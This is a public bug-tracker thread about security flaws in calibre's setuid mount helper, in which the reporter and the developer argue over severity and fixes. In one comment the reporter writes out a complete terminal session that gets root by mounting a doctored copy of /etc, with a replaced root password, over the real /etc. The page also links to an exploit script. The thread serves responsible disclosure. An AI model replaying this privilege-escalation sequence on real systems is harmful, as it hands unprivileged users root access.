                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          

            <div id="bug-branches">
              <h2>Related branches</h2>

              
                

 

 <div class="buglink-summary">

  <a href="https://code.launchpad.net/~kovid/calibre/trunk" class="sprite branch">lp:calibre</a>
  
  
</div>



              
            </div>
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2011-4124" title="Input validation issues were found in...">2011-4124</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2011-4125" title="A untrusted search path issue was fou...">2011-4125</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2011-4126" title="Race condition issues were found in C...">2011-4126</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T01:21:40.477375+00:00" title="2011-11-02 01:21:40 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/1"> #1</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite download-icon" href="https://bugs.launchpad.net/calibre/+bug/885027/+attachment/2582343/+files/50calibrerassaultmount.sh">exploit PoC</a>
        <a class="sprite edit action-icon" href="/calibre/+bug/885027/+attachment/2582343">Edit</a>
        (3.9 KiB,
        text/x-sh)
      </li>
    </ul>

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/2" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T04:09:06+00:00" title="2011-11-02 04:09:06 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/calibre/+bug/885027/comments/2">
                <strong>Re: calibre bug 885027</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/2"> #2</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I dont see how 1-3 are security vulnerabilities. 4 is a vulnerability only if<br />
mount itself is vulnerable to command line injection. 5 is indeed a<br />
vulnerability, but is neccesitated by the non uniformity of linux filesystems<br />
(mount, eject can be located anywhere). 5 can be mitigated by first checking<br />
for mount and eject in &quot;standard&quot; locations and only then trying all of PATH,<br />
changes for that will be in the next release.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I dont see how 1-3 are security vulnerabilities. 4 is a vulnerability only if
mount itself is vulnerable to command line injection. 5 is indeed a
vulnerability, but is neccesitated by the non uniformity of linux filesystems
(mount, eject can be located anywhere). 5 can be mitigated by first checking
for mount and eject in "standard" locations and only then trying all of PATH,
changes for that will be in the next release.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/3" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T05:49:46+00:00" title="2011-11-02 05:49:46 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/calibre/+bug/885027/comments/3">
                <strong>Fixed in lp:calibre</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/3"> #3</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Fixed in branch <a href="/+code/calibre" class="branch-short-link">lp:calibre</a>. The fix will be in the next release. calibre is usually released every Friday.</p>
<p>&nbsp;status fixreleased</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Fixed in branch lp:calibre. The fix will be in the next release. calibre is usually released every Friday.

 status fixreleased</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T06:04:11.348436+00:00" title="2011-11-02 06:04:11 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Oh, and I suppose there&#x27;s a very obvious but critical #6:</p>
<p>6. An unprivileged user an mount/unmount/eject whatever he wants, with<br />
root permissions. Danger.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Oh, and I suppose there's a very obvious but critical #6:

6. An unprivileged user an mount/unmount/eject whatever he wants, with
root permissions. Danger.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T06:16:49.427967+00:00" title="2011-11-02 06:16:49 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Basically though, you shouldn&#x27;t be using any suid executable at all. There&#x27;s no place for it. It&#x27;s not written correctly here, and there are lots of ways to avoid it entirely. In fact, Debian does the smart thing and strips yours out in favor of using a wrapper script around udisks: <a rel="nofollow" href="http://pastebin.com/HyVrJJyg">http://<wbr />pastebin.<wbr />com/HyVrJJyg</a></p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Basically though, you shouldn't be using any suid executable at all. There's no place for it. It's not written correctly here, and there are lots of ways to avoid it entirely. In fact, Debian does the smart thing and strips yours out in favor of using a wrapper script around udisks: http://pastebin.com/HyVrJJyg</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T06:18:27.046435+00:00" title="2011-11-02 06:18:27 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Regarding 1-3: certain programs might depend on the existence or lack of existence of a directory or file with a certain owner. The ability to add/remove a root owned directory/file anywhere on the system is most certainly a vulnerability of sorts.</p>
<p>Regarding 4: ...</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Regarding 1-3: certain programs might depend on the existence or lack of existence of a directory or file with a certain owner. The ability to add/remove a root owned directory/file anywhere on the system is most certainly a vulnerability of sorts.

Regarding 4: ...</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Released &#8594; Confirmed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T06:25:57+00:00" title="2011-11-02 06:25:57 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/calibre/+bug/885027/comments/7">
                <strong>Re: calibre bug 885027</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>You mean that a program designed to let an unprivileged user<br />
mount/unmount/eject anything he wants has a security flaw because it allows<br />
him to mount/unmount/eject anything he wants? I&#x27;m shocked.</p>
<p>Implement a system that allows an appilcation to mount/unmount/eject USB<br />
devices connected to the system securely, then make sure that system is<br />
universally adopted on every linux install in the universe. Once you&#x27;ve done that, feel free to<br />
re-open this ticket.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">You mean that a program designed to let an unprivileged user
mount/unmount/eject anything he wants has a security flaw because it allows
him to mount/unmount/eject anything he wants? I'm shocked. 

Implement a system that allows an appilcation to mount/unmount/eject USB
devices connected to the system securely, then make sure that system is
universally adopted on every linux install in the universe. Once you've done that, feel free to
re-open this ticket.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Confirmed &#8594; Invalid
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
    
    <time title="2011-11-02 07:04:19 UTC" datetime="2011-11-02T07:04:19.228260+00:00">on 2011-11-02</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>visibility</b>:
      </td>
      <td>
        private &#8594; public
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~dan-j-rosenberg" class="sprite person">Dan Rosenberg (dan-j-rosenberg)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T11:40:24.707111+00:00" title="2011-11-02 11:40:24 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>&quot;You mean that a program designed to let an unprivileged user<br />
mount/unmount/eject anything he wants has a security flaw because it allows<br />
him to mount/unmount/eject anything he wants? I&#x27;m shocked.&quot;</p>
<p>Unfortunately, sarcasm does not make you right.  Yes, this is a critical security flaw, because anyone with calibre installed on their system now allows any user to gain root privileges by mounting on top of important directories.  Just because your application allows this by design rather than by mistake doesn&#x27;t make this less of a problem.</p>
<p>As for the other flaws identified, they represent violations of DAC (Discretionary Access Control).  Essentially, if you can&#x27;t design your setuid program in a way that does not grant additional unintended capabilities to unprivileged users (besides a carefully stated intended capability like &quot;mount/umount/eject USB devices&quot;, then you shouldn&#x27;t be using a setuid application.</p>
<p>There are already ways to safely achieve what you&#x27;re trying to do without introducing security vulnerabilities.  Ubuntu implements automatic mounting of USB media using udisks in conjunction with gvfs-gdu-<wbr />volume-<wbr />monitor.  If this isn&#x27;t an option, the &quot;pmount&quot; application allows users to safely mount and unmount removable media without introducing (obvious) security holes.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">"You mean that a program designed to let an unprivileged user
mount/unmount/eject anything he wants has a security flaw because it allows
him to mount/unmount/eject anything he wants? I'm shocked."

Unfortunately, sarcasm does not make you right.  Yes, this is a critical security flaw, because anyone with calibre installed on their system now allows any user to gain root privileges by mounting on top of important directories.  Just because your application allows this by design rather than by mistake doesn't make this less of a problem.

As for the other flaws identified, they represent violations of DAC (Discretionary Access Control).  Essentially, if you can't design your setuid program in a way that does not grant additional unintended capabilities to unprivileged users (besides a carefully stated intended capability like "mount/umount/eject USB devices", then you shouldn't be using a setuid application.

There are already ways to safely achieve what you're trying to do without introducing security vulnerabilities.  Ubuntu implements automatic mounting of USB media using udisks in conjunction with gvfs-gdu-volume-monitor.  If this isn't an option, the "pmount" application allows users to safely mount and unmount removable media without introducing (obvious) security holes.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~kovid" class="sprite person">Kovid Goyal (kovid)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T12:42:57+00:00" title="2011-11-02 12:42:57 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Sarcasm doesn&#x27;t make me right, being right makes me right. The sarcasm was<br />
just a bonus earned by the sanctimoniusness of the post I was responding to.</p>
<p>Like I said before. Develop a way of doing this THAT ACTUALLY WORKS ACROSS AS<br />
MANY LINUX SYSTEMS AS THE CURRENT TECHNIQUE DOES. To re-emphasize that point<br />
since you seemed to miss it the first time. It needs to work on *every single<br />
linux distro that the current technique works on* not just version &gt;= x of distro<br />
y. If you can do so, feel free to re-open the ticket. If you cannot,<br />
feel free to not use calibre or patch your<br />
local install or ask your distro maintainer to patch it for you, replacing it<br />
with whatever technique works for that distro.</p>
<p>The OP pointed out one legitimate area of concern, which I<br />
have already committed a fix for.</p>
<p>You point out another, I have committed a fix for that as well.</p>
<p>Kindly do not lecture me about using a setuid exececutable. Shocking as that<br />
may seem, I am actually aware of the dangers, and even if I weren&#x27;t, rest<br />
assured that plenty of your ancestors have pointed it out to me in the past<br />
four years. Is it bad to have suid executables, yes. Is there a workable alternative, no.</p>
<p>&nbsp;&nbsp;status fixreleased</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Sarcasm doesn't make me right, being right makes me right. The sarcasm was
just a bonus earned by the sanctimoniusness of the post I was responding to. 

Like I said before. Develop a way of doing this THAT ACTUALLY WORKS ACROSS AS
MANY LINUX SYSTEMS AS THE CURRENT TECHNIQUE DOES. To re-emphasize that point
since you seemed to miss it the first time. It needs to work on *every single
linux distro that the current technique works on* not just version &gt;= x of distro
y. If you can do so, feel free to re-open the ticket. If you cannot, 
feel free to not use calibre or patch your
local install or ask your distro maintainer to patch it for you, replacing it
with whatever technique works for that distro. 

The OP pointed out one legitimate area of concern, which I
have already committed a fix for.

You point out another, I have committed a fix for that as well.

Kindly do not lecture me about using a setuid exececutable. Shocking as that
may seem, I am actually aware of the dangers, and even if I weren't, rest
assured that plenty of your ancestors have pointed it out to me in the past
four years. Is it bad to have suid executables, yes. Is there a workable alternative, no. 

  status fixreleased</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in calibre: </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Invalid &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/calibre/+bug/885027/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~zx2c4" class="sprite person">Jason A. Donenfeld (zx2c4)</a>
            wrote
            <time itemprop="commentTime" datetime="2011-11-02T13:10:33.644275+00:00" title="2011-11-02 13:10:33 UTC">on 2011-11-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/calibre/+bug/885027/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The following set of commands works against your latest trunk to achieve root.</p>
<p>zx2c4@ZX2C4-Laptop ~ $ dd if=/dev/zero of=overlay count=51200<br />
51200+0 records in<br />
51200+0 records out<br />
26214400 bytes (26 MB) copied, 0.0961621 s, 273 MB/s<br />
zx2c4@ZX2C4-Laptop ~ $ /usr/sbin/mkfs.vfat overlay<br />
mkfs.vfat 3.0.11 (24 Dec 2010)<br />
zx2c4@ZX2C4-Laptop ~ $ mkdir staging<br />
zx2c4@ZX2C4-Laptop ~ $ calibre-<wbr />mount-helper mount overlay staging<br />
zx2c4@ZX2C4-Laptop ~ $ cd staging/<br />
zx2c4@ZX2C4-Laptop ~/staging $ cp -a /etc/* . 2&gt;-<br />
zx2c4@ZX2C4-Laptop ~/staging $ cat passwd | tail -n +2 &gt; tmp<br />
zx2c4@ZX2C4-Laptop ~/staging $ echo &quot;root:$(echo -n &#x27;toor&#x27; | openssl passwd -1 -stdin)<wbr />:0:0:root:<wbr />/root:/<wbr />bin/bash&quot; &gt;&gt; tmp<br />
zx2c4@ZX2C4-Laptop ~/staging $ mv tmp passwd<br />
zx2c4@ZX2C4-Laptop ~/staging $ cd ..<br />
zx2c4@ZX2C4-Laptop ~ $ calibre-<wbr />mount-helper eject overlay staging<br />
eject: tried to use `./overlay&#x27; as device name but it is no block device<br />
eject: unable to find or open device for: `overlay&#x27;<br />
$ calibre-<wbr />mount-helper mount overlay /etc<br />
can&#x27;t link lock file /etc/mtab~: Operation not permitted (use -n flag to override)<br />
zx2c4@ZX2C4-Laptop ~ $ su<br />
Password: {types in the password &quot;toor&quot;}<br />
ZX2C4-Laptop zx2c4 # umount /etc<br />
ZX2C4-Laptop zx2c4 # whoami<br />
root<br />
ZX2C4-Laptop zx2c4 # id<br />
uid=0(root) gid=0(root) groups=<wbr />0(root)<wbr />,1(bin)<wbr />,2(daemon)<wbr />,3(sys)<wbr />,4(adm)<wbr />,6(disk)<wbr />,10(wheel)<wbr />,11(floppy)<wbr />,20(dialout)<wbr />,26(tape)<wbr />,27(video)</p>
<p>Have a nice day.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The following set of commands works against your latest trunk to achieve root.


zx2c4@ZX2C4-Laptop ~ $ dd if=/dev/zero of=overlay count=51200
51200+0 records in
51200+0 records out
26214400 bytes (26 MB) copied, 0.0961621 s, 273 MB/s
zx2c4@ZX2C4-Laptop ~ $ /usr/sbin/mkfs.vfat overlay
mkfs.vfat 3.0.11 (24 Dec 2010)
zx2c4@ZX2C4-Laptop ~ $ mkdir staging
zx2c4@ZX2C4-Laptop ~ $ calibre-mount-helper mount overlay staging
zx2c4@ZX2C4-Laptop ~ $ cd staging/
zx2c4@ZX2C4-Laptop ~/staging $ cp -a /etc/* . 2&gt;-
zx2c4@ZX2C4-Laptop ~/staging $ cat passwd | tail -n +2 &gt; tmp
zx2c4@ZX2C4-Laptop ~/staging $ echo "root:$(echo -n 'toor' | openssl passwd -1 -stdin):0:0:root:/root:/bin/bash" &gt;&gt; tmp
zx2c4@ZX2C4-Laptop ~/staging $ mv tmp passwd
zx2c4@ZX2C4-Laptop ~/staging $ cd ..
zx2c4@ZX2C4-Laptop ~ $ calibre-mount-helper eject overlay staging
eject: tried to use `./overlay' as device name but it is no block device
eject: unable to find or open device for: `overlay'
$ calibre-mount-helper mount overlay /etc
can't link lock file /etc/mtab~: Operation not permitted (use -n flag to override)
zx2c4@ZX2C4-Laptop ~ $ su
Password: {types in the password "toor"}
